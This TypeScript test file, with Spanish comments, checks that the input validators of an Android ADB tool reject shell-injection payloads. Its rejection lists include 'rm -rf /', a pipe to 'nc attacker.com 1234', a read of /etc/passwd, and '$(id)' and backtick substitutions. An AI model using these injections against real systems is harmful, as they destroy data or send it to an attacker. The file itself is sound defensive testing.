/**
 * Tests de validators — asegura que los allowlists rechazan payloads
 * con metacaracteres shell y aceptan valores legítimos.
 *
 * Finalidad: garantizar que la segunda línea de defensa (allowlist zod)
 * bloquea command injection antes de llegar al runner.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  packageNameSchema,
  apkPathSchema,
  resourceIdSchema,
  typeableTextSchema,
  searchFilterSchema,
} from "../src/adb/validators.ts";

// ---------------------------------------------------------------------------
// packageNameSchema
// ---------------------------------------------------------------------------
test("packageNameSchema accepts valid Android package names", () => {
  const valid = [
    "com.android.chrome",
    "com.example.app",
    "org.mozilla.firefox",
    "a.b",
    "com.company_x.app_y",
  ];
  for (const p of valid) {
    assert.equal(packageNameSchema.safeParse(p).success, true, `should accept "${p}"`);
  }
});

test("packageNameSchema rejects shell-metachar payloads", () => {
  const malicious = [
    "com.x; rm -rf /",
    "com.x && id",
    "com.x | nc attacker.com 1234",
    "com.x`whoami`",
    "com.x$(id)",
    "com.x\nid",
    "com.x > /tmp/pwn",
    "com.x < /etc/passwd",
    'com.x"id"',
    "com.x'id'",
    "com.x\\id",
    "",               // empty
    "a",              // too short
    "no_dot",         // missing dot
    ".starts.with.dot",
    "ends.with.dot.",
    "1starts.with.num",
  ];
  for (const p of malicious) {
    assert.equal(
      packageNameSchema.safeParse(p).success,
      false,
      `should reject "${p}"`
    );
  }
});

// ---------------------------------------------------------------------------
// apkPathSchema
// ---------------------------------------------------------------------------
test("apkPathSchema accepts valid .apk paths", () => {
  const valid = [
    "/tmp/app.apk",
    "/home/user/downloads/my-app.apk",
    "C:/temp/app.apk",
    "relative/path/app.apk",
  ];
  for (const p of valid) {
    assert.equal(apkPathSchema.safeParse(p).success, true, `should accept "${p}"`);
  }
});

test("apkPathSchema rejects non-apk or malicious paths", () => {
  const bad = [
    "/tmp/app.exe",
    "/tmp/app.apk; rm -rf /",
    "/tmp/app.apk && id",
    "/tmp/$(id).apk",
    "/tmp/`id`.apk",
    "not-an-apk",
    "",
  ];
  for (const p of bad) {
    assert.equal(apkPathSchema.safeParse(p).success, false, `should reject "${p}"`);
  }
});

// ---------------------------------------------------------------------------
// resourceIdSchema
// ---------------------------------------------------------------------------
test("resourceIdSchema accepts valid Android resource ids", () => {
  const valid = [
    "com.app:id/button_login",
    "com.example.app:id/edit_email",
    "android:id/button1",
  ];
  for (const r of valid) {
    assert.equal(resourceIdSchema.safeParse(r).success, true, `should accept "${r}"`);
  }
});

test("resourceIdSchema rejects malformed or malicious ids", () => {
  const bad = [
    "com.app:id/button; id",
    "com.app:id/$(id)",
    "no-colon",
    "com.app:id/",
    "",
  ];
  for (const r of bad) {
    assert.equal(resourceIdSchema.safeParse(r).success, false, `should reject "${r}"`);
  }
});

// ---------------------------------------------------------------------------
// typeableTextSchema
// ---------------------------------------------------------------------------
test("typeableTextSchema accepts common inputs", () => {
  const valid = [
    "hello world",
    "user@example.com",
    "password-123",
    "Claude_v2+",
    "search query",
    "",
    "phone: +51-987-654-321",
  ];
  for (const t of valid) {
    assert.equal(typeableTextSchema.safeParse(t).success, true, `should accept "${t}"`);
  }
});

test("typeableTextSchema rejects shell-metachar payloads", () => {
  const bad = [
    "hello; id",
    "hello && id",
    "hello | sh",
    "hello`whoami`",
    "hello$(id)",
    "hello'\"",
    "hello > /tmp/x",
    "hello\n",
    "hello\r",
    "hello<file",
  ];
  for (const t of bad) {
    assert.equal(typeableTextSchema.safeParse(t).success, false, `should reject "${t}"`);
  }
});

// ---------------------------------------------------------------------------
// searchFilterSchema
// ---------------------------------------------------------------------------
test("searchFilterSchema accepts arbitrary printable strings (used in-process)", () => {
  const valid = [
    "chrome",
    "com.google",
    "error",
    "Exception thrown",
    "hola; y rm",         // no llega al shell, se usa en JS
    "",
  ];
  for (const s of valid) {
    assert.equal(searchFilterSchema.safeParse(s).success, true, `should accept "${s}"`);
  }
});

test("searchFilterSchema rejects control characters and oversize", () => {
  assert.equal(searchFilterSchema.safeParse("bad\x00null").success, false);
  assert.equal(searchFilterSchema.safeParse("a".repeat(257)).success, false);
});
